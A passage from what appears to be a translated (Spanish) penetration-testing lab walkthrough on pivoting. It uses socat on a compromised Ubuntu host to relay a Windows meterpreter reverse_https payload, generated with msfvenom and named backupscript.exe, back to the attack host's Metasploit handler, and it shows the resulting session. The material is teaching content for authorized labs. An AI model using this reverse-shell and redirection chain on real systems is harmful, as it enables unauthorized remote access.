# Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat)es una herramienta de retransmisión bidireccional que puede crear enchufes de tuberías entre`2`canales de red independientes sin necesidad de usar túneles SSH. Actúa como un redirector que puede escuchar en un host y puerto y reenviar esos datos a otra dirección IP y puerto. Podemos iniciar el oyente de Metasploit usando el mismo comando mencionado en la última sección de nuestro host de ataque, y podemos comenzar`socat`en el servidor Ubuntu.

### **Comenzando Socat Oyente**

Redirección de Socat con una carcasa inversa

```
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

Socat escuchará en localhost en el puerto`8080`y reenviar todo el tráfico al puerto`80`en nuestro host de ataque (10.10.14.18). Una vez que se configura nuestro redirector, podemos crear una carga útil que se conectará a nuestro redirector, que se ejecuta en nuestro servidor Ubuntu. También comenzaremos un oyente en nuestro host de ataque porque tan pronto como Socat reciba una conexión de un objetivo, redirigirá todo el tráfico al oyente de nuestro anfitrión de ataques, donde obtendríamos un caparazón.

### **Creando la carga útil de Windows**

Redirección de Socat con una carcasa inversa

```
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe

```

Tenga en cuenta que debemos transferir esta carga útil al host de Windows. Podemos usar algunas de las mismas técnicas utilizadas en secciones anteriores para hacerlo.

### **Iniciar consola MSF**

Redirección de Socat con una carcasa inversa

```
xnoxos@htb[/htb]$ sudo msfconsole<SNIP>

```

### **Configurar y iniciar el Multi/Handler**

Redirección de Socat con una carcasa inversa

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80

```

Podemos probar esto ejecutando nuestra carga útil en el host de Windows nuevamente, y deberíamos ver una conexión de red desde el servidor Ubuntu esta vez.

### **Establecer la sesión de meterpreter**

Redirección de Socat con una carcasa inversa

```
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:80 handling request from 10.129.202.64; (UUID: 8hwcvdrp) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1 ) at 2022-03-07 11:08:10 -0500

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```